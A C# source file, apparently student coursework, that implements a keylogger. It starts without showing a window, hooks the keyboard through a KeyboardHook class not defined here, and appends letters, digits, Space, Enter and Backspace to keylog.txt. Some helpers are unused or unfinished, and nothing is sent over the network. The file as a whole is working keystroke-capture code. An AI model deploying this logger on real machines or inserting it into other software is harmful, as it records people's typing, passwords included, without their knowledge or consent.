using System;
using System.IO;
using System.Windows.Forms;
using System.Collections.Generic;


namespace CourseWork
{
	internal static class Program
	{
		private const string logFilePath = "keylog.txt";
		private static readonly Dictionary<Keys, string> keyMappings = new Dictionary<Keys, string>();
		private static HashSet<Keys> processedKeys = new HashSet<Keys>();

		[STAThread]
		static void Main()
		{
			InitializeKeyMappings();
			// To customize application configuration such as set high DPI settings or default font,
			// see https://aka.ms/applicationconfiguration.
			ApplicationConfiguration.Initialize();
			//Application.Run(new Form1());
			HookKeyboard();
		}

		private static void InitializeKeyMappings()
		{

			keyMappings[Keys.Space] = "Space";
			keyMappings[Keys.Enter] = "Enter";
			keyMappings[Keys.Back] = "Backspace";
			keyMappings[Keys.Oemcomma] = ",";
			keyMappings[Keys.A] = "A";
			keyMappings[Keys.B] = "B";
			keyMappings[Keys.C] = "C";
			keyMappings[Keys.D] = "D";
			keyMappings[Keys.E] = "E";
			keyMappings[Keys.F] = "F";
			keyMappings[Keys.G]	= "G";
			keyMappings[Keys.H] = "H";
			keyMappings[Keys.I] = "I";
			keyMappings[Keys.J] = "J";
			keyMappings[Keys.K] = "K";
			keyMappings[Keys.L] = "L";
			keyMappings[Keys.M] = "M";
			keyMappings[Keys.N] = "N";
			keyMappings[Keys.O] = "O";
			keyMappings[Keys.P] = "P";
			keyMappings[Keys.Q] = "Q";
			keyMappings[Keys.R] = "R";
			keyMappings[Keys.S] = "S";
			keyMappings[Keys.T] = "T";
			keyMappings[Keys.U] = "U";
			keyMappings[Keys.V] = "V";
			keyMappings[Keys.W] = "W";
			keyMappings[Keys.X] = "X";
			keyMappings[Keys.Y] = "Y";
			keyMappings[Keys.Z] = "Z";
		}

		private static void HookKeyboard()
		{
			using (var hook = new KeyboardHook())
			{
				hook.KeyPressed += OnKeyPressed;
				Application.Run();
			}
		}

		private static void OnKeyPressed(object sender, KeyPressedEventArgs e)
		{
			string key;

			if (e.Key == Keys.Space)
			{
				key = "Space";
			}
			else if (e.Key == Keys.Enter)
			{
				key = "Enter";
			}
			else if (e.Key == Keys.Back)
			{
				key = "Backspace";
			}
			else if ((e.Key >= Keys.A && e.Key <= Keys.Z) || (e.Key >= Keys.D0 && e.Key <= Keys.D9))
			{
				if (keyMappings.ContainsKey(e.Key))
				{
					key = keyMappings[e.Key];
				}
				else
				{
					char keyValue = (char)e.KeyValue;
					key = $"Press {GetKeyName(e.Key)} '{keyValue}'";
				}
			}
			else
			{
				// Ignore other keys
				return;
			}

			using (StreamWriter writer = new StreamWriter(logFilePath, true))
			{
				writer.WriteLine(key);
			}
		}



		private static char GetKeyValue(KeyPressedEventArgs e)
		{
			bool shiftPressed = (Control.ModifierKeys & Keys.Shift) != 0;
			char keyValue = (char)e.KeyValue;

			if (shiftPressed)
			{
				if (char.IsLetter(keyValue))
				{
					// If Shift is pressed and the key is a letter, convert to uppercase
					keyValue = char.ToUpper(keyValue);
				}
				else
				{
					// Handle other Shift combinations for special characters
					switch (e.Key)
					{
						case Keys.D1:
							keyValue = '!';
							break;
						case Keys.D2:
							keyValue = '@';
							break;
							// Add more cases as needed
					}
				}
			}

			return keyValue;
		}

		private static string GetKeyName(Keys key)
		{
			if (keyMappings.ContainsKey(key))
			{
				return keyMappings[key];
			}
			else
			{
				return new KeysConverter().ConvertToString(key);
			}
		}

	}
}